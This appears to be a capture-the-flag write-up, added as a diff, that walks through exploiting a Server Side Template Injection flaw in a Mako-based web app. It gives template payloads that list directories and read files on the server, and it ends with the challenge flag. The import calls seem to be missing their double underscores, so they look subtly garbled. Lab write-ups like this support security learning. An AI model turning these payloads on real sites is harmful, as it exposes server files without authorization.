@@ -1,0 +1,25 @@
+1. Opened the website at http://34.179.184.57:30716/ and saw a normal page displaying Hello with a name parameter
+
+2. Tested common Server Side Template Injection (SSTI) payloads including {{7*7}}, ${7*7}, ${{7*7}}, <%= 7*7 %>, and #{7*7}
+
+3. Observed that ${7*7} returned 49 instead of the normal Hello message, confirming the template engine was vulnerable to SSTI using Mako-style syntax
+
+4. Tested the payload 
+${open('/flag.txt').read()} 
+which returned an internal server error, indicating the file did not exist but the injection worked
+
+5. Used 
+${import('os').listdir('/')} 
+to list the root directory and saw a home folder
+
+6. Used 
+${import('os').listdir('/home')}
+and found a user directory named ctf
+
+7. Used
+${import('os').listdir('/home/ctf')}
+and saw a file named flag along with standard dotfiles and app.py
+
+8. Read the flag by using 
+${open('/home/ctf/flag').read()} 
+which returned CTF{4b08602e0090f81707b98ca687a5cacfd32888ffceef1d3cff2d99e6034b1e58}
